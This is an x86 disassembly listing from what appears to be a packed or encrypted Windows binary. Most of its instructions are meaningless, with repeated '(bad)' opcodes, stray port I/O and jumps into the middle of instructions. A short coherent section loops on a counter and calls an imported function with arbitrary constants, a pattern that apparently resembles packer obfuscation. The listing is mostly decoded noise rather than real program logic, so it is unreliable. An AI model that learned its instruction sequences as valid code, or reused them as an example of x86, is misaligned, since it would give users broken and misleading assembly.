  404831:	js     0x404878
  404833:	adc    edx,edx
  404835:	fwait
  404836:	cmp    al,0x4f
  404838:	jbe    0x404865
  40483a:	stos   DWORD PTR es:[edi],eax
  40483b:	rol    BYTE PTR [esi-0x122987d2],1
  404841:	fwait
  404842:	in     al,0xac
  404844:	enter  0x3945,0xbf
  404848:	xor    dh,bl
  40484a:	mov    gs,esp
  40484c:	dec    esp
  40484d:	xlat   BYTE PTR ds:[ebx]
  40484e:	call   0x59de:0x7f221eb2
  404855:	rcl    DWORD PTR [ecx-0x306b4659],cl
  40485b:	test   eax,0xd4b31a02
  404860:	les    ebp,FWORD PTR [esi-0x60]
  404863:	stos   BYTE PTR es:[edi],al
  404864:	pushf  
  404865:	xor    BYTE PTR [eax+edx*2-0x52aa8528],0x4
  40486d:	(bad)  [edx]
  40486f:	add    ch,dl
  404871:	imul   ecx,ebx,0xfffffffd
  404874:	(bad)  [edx]
  404876:	js     0x404851
  404878:	and    bl,BYTE PTR [edx-0x54]
  40487b:	sar    BYTE PTR [ebx+0x4a],0xef
  40487f:	loope  0x4048bc
  404881:	mov    DWORD PTR [edi-0x195f2919],ebx
  404887:	std    
  404888:	xor    eax,ebx
  40488a:	hlt    
  40488b:	push   ecx
  40488c:	pop    eax
  40488d:	mov    ch,0x11
  40488f:	popa   
  404890:	data16 das 
  404892:	mov    bl,0xd7
  404894:	adc    ebp,ebp
  404896:	dec    eax
  404897:	test   DWORD PTR [eax+edx*2-0x6f2b0cee],ebx
  40489e:	cs jle 0x40482d
  4048a1:	dec    ebx
  4048a2:	push   ebp
  4048a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048a4:	xor    al,0x42
  4048a6:	icebp  
  4048a7:	jp     0x404909
  4048a9:	data16 cmp ch,ch
  4048ac:	sub    al,0xf5
  4048ae:	cmp    BYTE PTR [edi+0x1d],ch
  4048b1:	jp     0x4048da
  4048b3:	jae    0x40486a
  4048b5:	in     eax,dx
  4048b6:	arpl   ax,ax
  4048b8:	mov    ds:0x12ddd84c,eax
  4048bd:	cld    
  4048be:	cmp    BYTE PTR [edx+0x7d033180],al
  4048c4:	scas   al,BYTE PTR es:[edi]
  4048c5:	not    DWORD PTR [edi+ecx*4]
  4048c8:	push   ebp
  4048c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048ca:	dec    ebp
  4048cb:	inc    edx
  4048cc:	sbb    BYTE PTR [eax-0x3f0b82c],bl
  4048d2:	xchg   si,ax
  4048d4:	ret    
  4048d5:	(bad)  [ebx+eax*4+0x784d3b1]
  4048dc:	jbe    0x40492b
  4048de:	xchg   esi,eax
  4048df:	xchg   edx,eax
  4048e0:	sbb    DWORD PTR [eax],ebp
  4048e2:	inc    esp
  4048e3:	xlat   BYTE PTR ds:[ebx]
  4048e4:	pop    ebp
  4048e5:	cmc    
  4048e6:	sbb    DWORD PTR [esi],eax
  4048e8:	(bad)  
  4048ea:	dec    eax
  4048eb:	and    dl,BYTE PTR [eax+0x3823f85a]
  4048f1:	sub    DWORD PTR [esi+0x7bf14bea],esi
  4048f7:	adc    dl,BYTE PTR [ebx+0xc4e8838]
  4048fd:	jge    0x4048a1
  4048ff:	sub    bl,cl
  404901:	inc    ebx
  404902:	cmp    BYTE PTR [edx-0x2895a323],dl
  404908:	aam    0x6a
  40490a:	mov    ecx,0x3ead500a
  40490f:	mov    ecx,0x4b84298f
  404914:	sbb    DWORD PTR [esi-0x2c],esi
  404917:	jns    0x4048a3
  404919:	or     cl,bl
  40491b:	pop    esp
  40491c:	(bad)  [edx+0x49]
  40491f:	jo     0x4048ef
  404921:	inc    ecx
  404922:	out    dx,al
  404923:	or     eax,0x8604e656
  404928:	add    DWORD PTR [ebx],ecx
  40492a:	fwait
  40492b:	xor    esp,esi
  40492d:	stos   BYTE PTR es:[edi],al
  40492e:	push   ebx
  40492f:	fisttp DWORD PTR [ebp-0x725477bc]
  404935:	or     al,0x3b
  404937:	cmp    BYTE PTR [edx],cl
  404939:	mov    ebx,0xdc09f0d4
  40493e:	popw   es
  404940:	retf   
  404941:	fisubr WORD PTR [eax-0x3e3b41eb]
  404947:	add    al,0x43
  404949:	push   edi
  40494a:	dec    dx
  40494c:	imul   ebx,DWORD PTR [edi],0x94bb2de4
  404952:	mov    ecx,0x92e96b0a
  404957:	out    dx,eax
  404958:	adc    BYTE PTR [edi+0x3c33d15d],dh
  40495e:	xchg   ebp,eax
  40495f:	mov    ebp,ecx
  404961:	test   eax,0xdc4bf2b
  404966:	retf   0x40a1
  404969:	pop    esi
  40496a:	jo     0x4049d6
  40496c:	icebp  
  40496d:	dec    eax
  40496e:	cmp    al,0x8f
  404970:	jae    0x4049d5
  404972:	clc    
  404973:	pop    ss
  404974:	(bad)
  404977:	mov    cl,BYTE PTR ds:0x3e18eec7
  40497d:	ja     0x4049fc
  40497f:	fwait
  404980:	ins    BYTE PTR es:[edi],dx
  404981:	push   0xe
  404983:	mov    ebx,0x4a3bb041
  404988:	repz inc edi
  40498a:	popf   
  40498b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40498c:	sub    eax,0x7a14c708
  404991:	lock push esi
  404993:	jmp    0x4049c4
  404995:	cmp    bh,bh
  404997:	add    BYTE PTR [edi-0x4d],al
  40499a:	mov    ecx,0xa4126a69
  40499f:	in     al,0x7
  4049a1:	stc    
  4049a2:	cld    
  4049a3:	pop    ebp
  4049a4:	xchg   edx,eax
  4049a5:	mov    eax,0xd19ae338
  4049aa:	sti    
  4049ab:	pop    eax
  4049ac:	inc    edx
  4049ad:	int    0x18
  4049af:	iret   
  4049b0:	push   esp
  4049b1:	sbb    esp,ebp
  4049b3:	shr    dl,1
  4049b5:	(bad)
  4049b8:	ret    0xabba
  4049bb:	shl    esp,0x9d
  4049be:	pusha  
  4049bf:	mov    edi,0xddb76194
  4049c4:	aas    
  4049c5:	mov    es,WORD PTR [edx-0x39]
  4049c8:	ror    cl,1
  4049ca:	js     0x4049eb
  4049cc:	dec    eax
  4049cd:	aad    0xa
  4049cf:	(bad)  
  4049d1:	(bad)  
  4049d2:	pop    ss
  4049d3:	mov    esi,0x9254da8e
  4049d8:	shl    DWORD PTR [ecx-0x2fdb0cc6],0x97
  4049df:	pop    ss
  4049e0:	into   
  4049e1:	imul   esi,DWORD PTR [ebx+edi*1-0x45d34548],0xa4c0cf7b
  4049ec:	push   ss
  4049ed:	xlat   BYTE PTR ds:[ebx]
  4049ee:	inc    ebx
  4049ef:	mov    ecx,0xe9545ba4
  4049f4:	mov    eax,ds:0x7ff3b3ea
  4049f9:	fsubr  QWORD PTR [eax-0x77cf72a6]
  4049ff:	jns    0x404a74
  404a01:	lods   eax,DWORD PTR ds:[esi]
  404a02:	mov    ecx,0x3c8d87b3
  404a07:	in     al,0x95
  404a09:	imul   ebp,DWORD PTR [eax+0x5b258d6d],0x9baebeb3
  404a13:	jle    0x4049e3
  404a15:	mov    dl,0x1d
  404a17:	mov    ds:0x6f53e4b0,eax
  404a1c:	jmp    0x92b8:0xae13d8ef
  404a23:	pop    eax
  404a24:	(bad)  
  404a25:	call   0xe053cb1
  404a2a:	jmp    0x404a82
  404a2c:	dec    ecx
  404a2d:	add    al,dl
  404a2f:	mov    WORD PTR [esi+edx*4+0x3f3d10e7],ss
  404a36:	lahf   
  404a37:	cmc    
  404a38:	or     BYTE PTR [esi],ah
  404a3a:	jmp    0x4049e2
  404a3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a3d:	sbb    esp,DWORD PTR [ebp-0x3ac2fcae]
  404a43:	dec    edx
  404a44:	(bad)  
  404a45:	out    0x72,eax
  404a47:	mov    esp,DWORD PTR [ecx-0x4a]
  404a4a:	jle    0x4049e7
  404a4c:	xor    al,0xb9
  404a4e:	push   eax
  404a4f:	or     BYTE PTR [ecx+0x7],dl
  404a52:	and    DWORD PTR ds:0x42a859,0x0
  404a5c:	mov    esi,DWORD PTR ds:0x42a859
  404a62:	inc    esi
  404a63:	mov    DWORD PTR ds:0x42a859,esi
  404a69:	cmp    DWORD PTR ds:0x42a859,0xd
  404a70:	jne    0x404a9d
  404a76:	push   DWORD PTR [ebp-0x28]
  404a79:	push   0x69d2
  404a7e:	push   0x518b
  404a83:	push   0x83d6
  404a88:	push   0x4eb7
  404a8d:	push   0x680f
  404a92:	push   0x7bad
  404a97:	call   DWORD PTR ds:0x41d188
  404a9d:	cmp    DWORD PTR ds:0x42a859,0xc
  404aa4:	jne    0x404ab7
  404aaa:	mov    esi,DWORD PTR ds:0x42a859
  404ab0:	inc    esi
  404ab1:	mov    DWORD PTR ds:0x42a859,esi
  404ab7:	cmp    DWORD PTR ds:0x42a859,0x16
  404abe:	jb     0x404a5c
  404ac4:	xor    edx,ecx
  404ac6:	sub    esi,DWORD PTR ds:0x42a81d
  404acc:	mov    esi,0x327298
  404ad1:	jmp    0x404dc1
  404ad6:	enter  0xc53c,0xd1
  404ada:	(bad)  
  404adc:	aam    0xc1
  404ade:	mov    ah,0xf9
  404ae0:	int3   
  404ae1:	push   edx
  404ae2:	xchg   esi,eax
  404ae3:	(bad)  
  404ae4:	test   BYTE PTR cs:[esi+0x2e],0x78
  404ae9:	js     0x404b38
  404aeb:	jle    0x404b65
  404aed:	js     0x404af3
  404aef:	dec    edx
  404af0:	test   BYTE PTR [ecx],bl
  404af2:	or     cl,BYTE PTR [ebx-0xc4b201b]
  404af8:	pop    edx
  404af9:	mov    ch,0x76
  404afb:	int    0xab
  404afd:	add    eax,0x706c7fbc
  404b02:	dec    esp
  404b03:	adc    al,0x69
  404b05:	mov    gs,WORD PTR [esp+ebx*8+0x68]
  404b09:	data16 add dl,BYTE PTR [eax]
  404b0c:	call   FWORD PTR [edi+ebx*4]
  404b0f:	outs   dx,BYTE PTR ds:[esi]
  404b10:	repz pop ebp
  404b12:	pop    edx
  404b13:	fcom   DWORD PTR [esi+0x26]
  404b16:	sar    DWORD PTR [ecx-0x64],1
  404b19:	dec    ebx
  404b1a:	xchg   esp,eax
  404b1b:	lock fsub DWORD PTR [ebx]
  404b1e:	rcr    DWORD PTR [edi],cl
  404b20:	xor    esp,esi
  404b22:	js     0x404adc
  404b24:	mov    al,0x2f
  404b26:	(bad)
  404b29:	fisttp QWORD PTR [ebp+0x47fbe31b]
  404b2f:	cmp    ebx,eax
  404b31:	push   eax
  404b32:	and    BYTE PTR [edx-0x23],dh
  404b35:	lea    esp,[ecx-0x45041b73]
  404b3b:	mov    ebx,0x4393ca49
  404b40:	fisubr DWORD PTR ds:0x94bd9e36
  404b46:	je     0x404b26
  404b48:	or     esi,ecx
  404b4a:	repnz mov cl,0xe3
  404b4d:	mov    ecx,0xcf672c9d
  404b52:	xchg   ebp,eax
  404b53:	hlt    
  404b54:	std    
  404b55:	ss in  eax,dx
  404b57:	scas   al,BYTE PTR es:[edi]
  404b58:	test   eax,0x3db39303
  404b5d:	pushf  
  404b5e:	test   eax,0x7b931c2a
  404b63:	in     eax,0x19
  404b65:	cmp    al,BYTE PTR [ebx-0x4e]
  404b68:	fdivr  DWORD PTR fs:[ebx-0x1063b0ba]
  404b6f:	mov    ebp,0x3d03b9b
  404b74:	ret    0x11f4
  404b77:	jo     0x404b6b
  404b79:	adc    edi,edx
  404b7b:	sub    al,0xcc
  404b7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b7e:	nop
  404b7f:	ret    0x210a
  404b82:	sub    BYTE PTR [edi],ah
  404b84:	jge    0x404c05
  404b86:	adc    al,bh
  404b88:	imul   DWORD PTR [esi+0x2d]
  404b8b:	xor    esi,edx
  404b8d:	cdq    
  404b8e:	sbb    eax,0x68dd6313
  404b93:	out    0x78,al
  404b95:	cmp    DWORD PTR [eax+0x53f88c36],edi
  404b9b:	adc    eax,DWORD PTR [esi+ecx*8]
  404b9e:	lahf   
  404b9f:	xchg   edx,eax
  404ba0:	jmp    0x404b57
  404ba2:	gs adc eax,0xc624ed98
  404ba8:	inc    eax
  404ba9:	mov    bl,0x63
  404bab:	sub    eax,0x208da20e
  404bb0:	pop    ebx
  404bb1:	sub    ecx,ecx
  404bb3:	into   
  404bb4:	xchg   ebx,eax
  404bb5:	retf   0x1212
  404bb8:	xchg   DWORD PTR [edi],esi
  404bba:	fistp  WORD PTR [ebp-0x3e]
  404bbd:	lods   eax,DWORD PTR ds:[esi]
  404bbe:	loop   0x404b55
  404bc0:	das    
  404bc1:	sub    dl,dl
  404bc3:	data16 (bad) 
  404bc5:	fldcw  WORD PTR ds:0x327b3b0
  404bcb:	arpl   dx,bp
  404bcd:	ret    0x7b08
  404bd0:	or     DWORD PTR [esi+ebx*2],ebp
  404bd3:	(bad)  
  404bd4:	(bad)  
  404bd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bd7:	(bad)  
  404bd8:	xchg   ecx,eax
  404bd9:	add    DWORD PTR [esi+0x2d],ebx
  404bdc:	(bad)  [ebx-0x78]
  404bdf:	cld    
  404be0:	xor    al,0x5b
  404be2:	jle    0x404bf9
  404be4:	cwde   
  404be5:	jecxz  0x404b7a
  404be7:	pushf  
  404be8:	mov    eax,ds:0x94fd3298
  404bed:	(bad)  
  404bee:	mov    DWORD PTR [ebp-0x237677a4],ebx
  404bf4:	fisttp DWORD PTR [esi-0x80]
  404bf7:	in     eax,dx
  404bf8:	dec    ebx
  404bf9:	jmp    0x71eaec58
  404bfe:	push   DWORD PTR [eax+0x76]
  404c01:	nop
  404c02:	xchg   edi,eax
  404c03:	add    ecx,DWORD PTR [ecx-0x2f70c339]
  404c09:	int    0x34
  404c0b:	xchg   edi,eax
  404c0c:	sub    eax,0x70aba026
  404c11:	dec    esp
  404c12:	jge    0x404bcc
  404c14:	dec    ebx
  404c15:	adc    DWORD PTR [edi],esi
  404c17:	lds    esp,FWORD PTR [edi]
  404c19:	jmp    0x404c38
  404c1b:	in     al,0xf8
  404c1d:	test   DWORD PTR [ebx+ecx*8],edx
  404c20:	xchg   esi,eax
  404c21:	push   0x2
  404c23:	fbld   TBYTE PTR ds:0xba2c4484
  404c29:	es icebp 
  404c2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c2d:	mov    eax,0xe1a98f2e
  404c32:	idiv   BYTE PTR [esi*2-0xef12b2a]
  404c39:	dec    ebx
  404c3a:	(bad)  
  404c3b:	stos   BYTE PTR es:[edi],al
  404c3c:	push   es
  404c3d:	pop    eax
  404c3e:	xor    eax,0x9b20e322
  404c43:	stos   BYTE PTR es:[edi],al
  404c44:	mov    gs,esp
  404c46:	mov    al,ds:0xaaea2f97
  404c4b:	mov    bl,0xa4
  404c4d:	mov    dl,0x52
  404c4f:	add    dl,BYTE PTR [esi+0x58d98ff]
  404c55:	out    dx,eax
  404c56:	inc    ecx
  404c57:	in     al,dx
  404c58:	push   ds
  404c59:	add    al,0xd9
  404c5b:	pop    esp
  404c5c:	adc    BYTE PTR [edi+0x8cbe390],bl
  404c62:	mov    ecx,0x61b8dfc1
  404c67:	xlat   BYTE PTR ds:[ebx]
  404c68:	fisub  DWORD PTR [ecx-0xeb9d361]
  404c6e:	push   edx
  404c6f:	xchg   ebx,eax
  404c70:	xchg   esi,eax
  404c71:	ficom  DWORD PTR [edx-0x7c0be891]
  404c77:	jb     0x404c4f
  404c79:	xchg   ecx,eax
  404c7a:	push   ss
  404c7b:	mov    ecx,0x353fbd34
  404c80:	cwde   
  404c81:	jbe    0x404c5c
  404c83:	das    
  404c84:	and    al,0x47
  404c86:	addr16 js 0x404c83
  404c89:	sub    DWORD PTR [ecx],eax
  404c8b:	in     eax,dx
  404c8c:	icebp  
  404c8d:	sti    
  404c8e:	jg     0x404caa
  404c90:	jns    0x404c63
  404c92:	mov    al,ds:0x8b40ff8f
  404c97:	push   ebp
  404c98:	inc    ecx
  404c99:	nop
  404c9a:	inc    esp
  404c9b:	popa   
  404c9c:	and    BYTE PTR [edi-0x28],0x68
  404ca0:	pusha  
  404ca1:	dec    edi
  404ca2:	mov    bl,0x3b
  404ca4:	fnstsw WORD PTR [ebx+esi*8+0x7f23c60]
  404cab:	pop    ds
  404cac:	loop   0x404cbf
  404cae:	gs xor edi,esi
  404cb1:	je     0x404ca4
  404cb3:	hlt    
  404cb4:	enter  0x9b1a,0x91
  404cb8:	scas   al,BYTE PTR es:[edi]
  404cb9:	mov    eax,0x13207f31
  404cbe:	dec    ecx
  404cbf:	pop    es
  404cc0:	pushf  
  404cc1:	pop    esi
  404cc2:	cmp    ch,ch
  404cc4:	dec    edi
  404cc5:	pop    esp
  404cc6:	fwait
  404cc7:	ret    0x11ed
  404cca:	rcr    BYTE PTR ds:0x196820c0,1
  404cd0:	imul   BYTE PTR [edi]
  404cd2:	pop    esi
  404cd3:	xchg   edi,eax
  404cd4:	cmp    dl,BYTE PTR [ebx-0x4230f94e]
  404cda:	test   BYTE PTR [esi+0x3c],bl
  404cdd:	fnstenv [ebx+0x4a]
  404ce0:	sbb    BYTE PTR ds:0x8bf891e,0x8
  404ce7:	push   ebx
  404ce8:	(bad)  
  404ce9:	cld    
  404cea:	pop    edi
  404ceb:	or     bl,BYTE PTR [ebx-0x61f2a17d]
  404cf1:	stos   BYTE PTR es:[edi],al
  404cf2:	or     BYTE PTR [ecx+0xb],0x79
  404cf6:	popf   
  404cf7:	and    edx,ecx
  404cf9:	xor    ah,al
  404cfb:	out    dx,al
  404cfc:	mov    bh,0x9c
  404cfe:	jl     0x404cb5
  404d00:	cmp    esp,DWORD PTR [edx-0x3abde088]
  404d06:	pop    edi
  404d07:	pop    ds
  404d08:	in     al,0x5e
  404d0a:	(bad)  
  404d0b:	dec    ecx
  404d0c:	cmc    
  404d0d:	cli    
  404d0e:	fwait
  404d0f:	std    
  404d10:	inc    edi
  404d11:	mov    dh,BYTE PTR [eax-0x13]
  404d14:	es into 
  404d16:	pop    ebx
  404d17:	push   es
  404d18:	push   edi
  404d19:	add    BYTE PTR [esi],ch
  404d1b:	test   al,0x3e
  404d1d:	xlat   BYTE PTR ds:[ebx]
  404d1e:	jle    0x404d00
  404d20:	mov    DWORD PTR [esi],edx
  404d22:	push   ebx
  404d23:	sub    eax,0x653a50bd
  404d28:	in     al,dx
  404d29:	(bad)  
  404d2a:	test   eax,0x53f0cb37
  404d2f:	cmp    esi,DWORD PTR [edx]
  404d31:	int    0xbc
  404d33:	call   0xfc2f:0x309db6c4
  404d3a:	std    
  404d3b:	iret   
  404d3c:	or     ecx,DWORD PTR [ecx]
  404d3e:	clc    
  404d3f:	jns    0x404d76
  404d41:	stos   DWORD PTR es:[edi],eax
  404d42:	test   BYTE PTR [eax-0x1835add5],ch
  404d48:	jae    0x404d77
  404d4a:	sbb    DWORD PTR ds:0xb8b8bd29,esp
  404d50:	retf   
  404d51:	xchg   DWORD PTR [esi+0x34296f04],esi
  404d57:	and    eax,DWORD PTR [eax+0x23]
  404d5a:	cld    
  404d5b:	jo     0x404cfe
  404d5d:	push   0xffffff83
  404d5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d60:	xor    DWORD PTR [edi-0x16],ebp
  404d63:	loopne 0x404d8b
  404d65:	xor    dl,ah
  404d67:	xchg   edi,eax
  404d68:	icebp  
  404d69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d6a:	inc    ebx
  404d6b:	ror    BYTE PTR [ecx+0x65f9f489],0x6f
  404d72:	sub    eax,0x488125c6
  404d77:	xchg   edi,eax
  404d78:	mov    eax,0x2f983fd5
  404d7d:	adc    dh,BYTE PTR [edi-0x44]
  404d80:	(bad)  
  404d82:	icebp  
  404d83:	fadd   QWORD PTR [edi]
  404d85:	lds    edi,FWORD PTR [ebp+0x19]
  404d88:	test   al,0x1e
  404d8a:	mov    ds:0x433af442,eax
  404d8f:	sub    BYTE PTR [edx],al
  404d91:	scas   al,BYTE PTR es:[edi]
  404d92:	mov    esi,0xaaa4489
  404d97:	int3   
  404d98:	pop    ebx
  404d99:	mov    bl,0x2d
  404d9b:	repz mov al,ds:0x5fa399
  404da1:	dec    ebx
  404da2:	lock (bad) 
  404da4:	pcmpgtw mm3,QWORD PTR [ecx]
  404da7:	iret   
  404da8:	(bad)  
  404da9:	fist   WORD PTR [eax]
  404dab:	(bad)  
  404dac:	sub    ebp,DWORD PTR [esi+0x4d6e4003]
  404db2:	push   esp
  404db3:	ins    BYTE PTR es:[edi],dx
  404db4:	cpuid  
  404db6:	shl    BYTE PTR [edx-0x60],0x6a
  404dba:	test   DWORD PTR [esi],0x182b12c5
  404dc0:	lock push edi
  404dc2:	mov    edi,DWORD PTR [ebp+0x10]
  404dc5:	add    edx,esi
  404dc7:	cmp    edi,edx
  404dc9:	je     0x405a02
  404dcf:	mov    edx,DWORD PTR [ebp-0x8]
  404dd2:	mov    eax,DWORD PTR [ebp-0x4]
  404dd5:	xor    eax,ecx
  404dd7:	jmp    0x4050c7
  404ddc:	(bad)
  404ddf:	rcl    cl,0xd4
  404de2:	leave  
  404de3:	aad    0x26
  404de5:	xor    dh,BYTE PTR [esp+edx*2]
  404de8:	(bad)
  404ded:	xor    edi,DWORD PTR [eax+0x78]
  404df0:	dec    ebp
  404df1:	jle    0x404e6b
  404df3:	js     0x404ded
  404df5:	push   ecx
  404df6:	in     eax,0x82
  404df8:	test   ecx,eax
  404dfa:	out    dx,eax
  404dfb:	and    eax,0xe3708af4
  404e00:	dec    esi
  404e01:	dec    ecx
  404e02:	adc    DWORD PTR ds:0xc670f742,ecx
  404e08:	int    0x39
  404e0a:	sbb    eax,0x95806da4
  404e0f:	js     0x404e1b
  404e11:	fs mov ebx,0x2021d864
  404e17:	push   eax
  404e18:	iret   
  404e19:	push   0xdc1c57
  404e1e:	into   
  404e1f:	test   DWORD PTR [esi-0x67b6efff],ecx
  404e25:	lds    bp,DWORD PTR [edx-0x5f]
  404e29:	inc    esp
  404e2a:	hlt    
  404e2b:	sub    ecx,DWORD PTR [edi-0x27c175b6]
  404e31:	mov    ebp,0xdcbd952f
  404e36:	lds    ebp,FWORD PTR [edx+0x7a]
  404e39:	shl    BYTE PTR [esi],cl
  404e3b:	(bad)  
  404e3c:	in     eax,dx
  404e3d:	ror    ecx,cl
  404e3f:	(bad)  
  404e40:	stc    
  404e41:	jecxz  0x404e91
  404e43:	lock pop esp
  404e45:	out    0x9,al
  404e47:	in     al,0x73
  404e49:	shr    ecx,cl
  404e4b:	data16 sbb al,0x1b
  404e4e:	(bad)
  404e51:	addr16 test al,0xbe
  404e54:	cmp    esp,0xdc73dbd5
  404e5a:	dec    edx
  404e5b:	adc    al,0xc4
  404e5d:	rcl    dh,cl
  404e5f:	test   DWORD PTR [edx+0x2e34eb53],ebx
  404e65:	outs   dx,DWORD PTR ds:[esi]
  404e66:	jl     0x404e96
  404e68:	repnz sub BYTE PTR [edi+0x23],dh
  404e6c:	arpl   cx,ax
  404e6e:	mov    dh,0x90
  404e70:	jmp    0x2e3804bd
  404e75:	retf   
  404e76:	xor    dh,BYTE PTR [edi+0x24]
  404e79:	iret   
  404e7a:	jne    0x404ebb
  404e7c:	mov    ah,bl
  404e7e:	sbb    BYTE PTR ss:[eax],bl
  404e81:	push   esi
  404e82:	and    BYTE PTR [edx-0x19],cl
  404e85:	sub    edx,DWORD PTR [ecx-0x5f44ef84]
  404e8b:	xchg   ecx,eax
  404e8c:	or     DWORD PTR [esi],eax
  404e8e:	aam    0x74
  404e90:	jl     0x404ec2
  404e92:	push   ecx
  404e93:	sub    ch,BYTE PTR [edx+0x4e402c56]
  404e99:	pushf  
  404e9a:	(bad)  
  404e9b:	mov    edx,0xb92beffe
  404ea0:	test   eax,0x33d1f2bb
  404ea5:	stos   DWORD PTR es:[edi],eax
  404ea6:	retf   
  404ea7:	lahf   
  404ea8:	and    eax,0x2dc04324
  404ead:	mov    bl,al
  404eaf:	add    DWORD PTR [esi+0x50],ebp
  404eb2:	inc    ecx
  404eb3:	mov    ds:0xb583c471,eax
  404eb8:	ror    al,cl
  404eba:	jge    0x404f02
  404ebc:	(bad)  
  404ebd:	int    0x4e
  404ebf:	push   esp
  404ec0:	js     0x404e69
  404ec2:	mov    edi,0x5e4b78e6
  404ec7:	xor    DWORD PTR [ecx],edi
  404ec9:	jp     0x404efd
  404ecb:	and    BYTE PTR [eax-0x3f494e18],cl
  404ed1:	sbb    BYTE PTR [ebp+0x697a3e],dl
  404ed7:	ds push ebp
  404ed9:	xchg   ebx,eax
  404eda:	and    cl,BYTE PTR [ebx]
  404edc:	int3   
  404edd:	xor    al,0x4f
  404edf:	xchg   DWORD PTR [ebx-0x7c442f56],eax
  404ee5:	jb     0x404f02
  404ee7:	retf   
  404ee8:	xor    eax,0x9dac0231
  404eed:	mov    eax,ds:0x299e99ba
  404ef2:	loop   0x404ef9
  404ef4:	lahf   
  404ef5:	ins    BYTE PTR es:[edi],dx
  404ef6:	std    
  404ef7:	and    ebp,edi
  404ef9:	xchg   ecx,eax
  404efa:	scas   al,BYTE PTR es:[edi]
  404efb:	push   edi
  404efc:	or     esi,esi
  404efe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404eff:	in     al,dx
  404f00:	jge    0x404f02
  404f02:	jg     0x404e88
  404f04:	or     BYTE PTR [ebp-0x39],al
  404f07:	push   esi
  404f08:	cmp    cl,BYTE PTR [edx+0x79daf298]
  404f0e:	push   esp
  404f0f:	stos   BYTE PTR es:[edi],al
  404f10:	scas   al,BYTE PTR es:[edi]
  404f11:	cmp    eax,0xd556889a
  404f16:	push   0xfffffff1
  404f18:	repnz les edi,FWORD PTR [edx-0x6af70909]
  404f1f:	inc    ebp
  404f20:	or     al,0x71
  404f22:	dec    ecx
  404f23:	(bad)  
  404f24:	mov    ch,0x5a
  404f26:	xor    BYTE PTR [ecx+ecx*4-0x1],bh
  404f2a:	fadd   DWORD PTR [edi]
  404f2c:	jae    0x404f7c
  404f2e:	ja     0x404f05
  404f30:	mov    al,ds:0x1eb9b66d
  404f35:	ss mov dl,0x16
  404f38:	inc    ebp
  404f39:	repnz mov ecx,DWORD PTR [ebp+eax*4+0x381f8053]
  404f41:	call   0x51f9b006
  404f46:	ja     0x404ed8
  404f48:	dec    edx
  404f49:	(bad)  
  404f4b:	int3   
  404f4c:	push   edi
  404f4d:	es add al,0xea
  404f50:	fwait
  404f51:	xor    al,0x83
  404f53:	sbb    al,0x51
  404f55:	out    0x59,al
  404f57:	test   DWORD PTR [ecx+0x65418525],edx
  404f5d:	int3   
  404f5e:	dec    edi
  404f5f:	jge    0x404f63
  404f61:	mov    al,0x3
  404f63:	jecxz  0x404eee
  404f65:	jmp    0x2f060644
  404f6a:	inc    ebp
  404f6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f6c:	inc    BYTE PTR [edx-0x4f]
  404f6f:	push   ebp
  404f70:	sbb    DWORD PTR [ebx+0x1e],edi
  404f73:	enter  0x94f4,0xba
  404f77:	repnz pop esp
  404f79:	repnz pop ebp
  404f7b:	pop    ebx
  404f7c:	int    0x3
  404f7e:	xor    eax,0x1ba8bf22
  404f83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f84:	nop
  404f85:	jecxz  0x404fe8
  404f87:	push   ebx
  404f88:	test   DWORD PTR [edi-0x7c],edx
  404f8b:	adc    DWORD PTR [esi-0x3d],ebx
  404f8e:	rcr    ecx,1
  404f90:	pop    edi
  404f91:	mov    al,0x22
  404f93:	or     ch,dh
  404f95:	pop    ebx
  404f96:	mov    eax,0x246d2e9b
  404f9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f9c:	std    
  404f9d:	fld    QWORD PTR [edx-0x59]
  404fa0:	popf   
  404fa1:	inc    edx
  404fa2:	dec    ebx
  404fa3:	in     al,dx
  404fa4:	add    edx,DWORD PTR [esi+0x4d]
  404fa7:	jno    0x404fe7
  404fa9:	scas   eax,DWORD PTR es:[edi]
  404faa:	push   es
  404fab:	mov    eax,0xe24dd9
  404fb0:	out    0xa5,eax
  404fb2:	jns    0x404ff9
  404fb4:	fist   DWORD PTR [edi+ecx*8]
  404fb7:	arpl   sp,si
  404fb9:	retf   
  404fba:	shl    BYTE PTR [esi+0xa43b2bc],cl
  404fc0:	daa    
  404fc1:	mov    WORD PTR [edi+ecx*2],cs
  404fc4:	aad    0x9c
  404fc6:	sbb    DWORD PTR [eax+ecx*1+0x32a69f58],ebp
  404fcd:	inc    ebx
  404fce:	mov    ch,0x41
  404fd0:	sbb    bh,ch
  404fd2:	aaa    
  404fd3:	repnz (bad)
  404fd6:	retf   
  404fd7:	adc    edi,DWORD PTR ds:0xa7c26361
  404fdd:	and    al,0xa7
  404fdf:	push   ebx
  404fe0:	push   ds
  404fe1:	push   ecx
  404fe2:	mov    ds:0xcf1cdbe2,eax
  404fe7:	stos   DWORD PTR es:[edi],eax
  404fe8:	div    BYTE PTR [edx+0x6d451ad3]
  404fee:	cmp    eax,0x917a40fa
  404ff3:	sbb    BYTE PTR [edx],bl
  404ff5:	mov    al,0xbd
  404ff7:	jecxz  0x404fd0
  404ff9:	les    edx,FWORD PTR [ecx+0x34]
  404ffc:	adc    al,0x67
  404ffe:	popf   
  404fff:	loope  0x405065
  405001:	pop    ebx
  405002:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405003:	jg     0x404f9b
  405005:	or     eax,0xdb1a1e84
  40500a:	push   ds
  40500b:	adc    eax,DWORD PTR [esp+ebp*2+0x9]
  40500f:	das    
  405010:	in     eax,0x21
  405012:	scas   al,BYTE PTR es:[edi]
  405013:	adc    DWORD PTR [ecx+0x5f],0x6240af98
  40501a:	mov    DWORD PTR [ebp+ebp*1+0x677219d4],edx
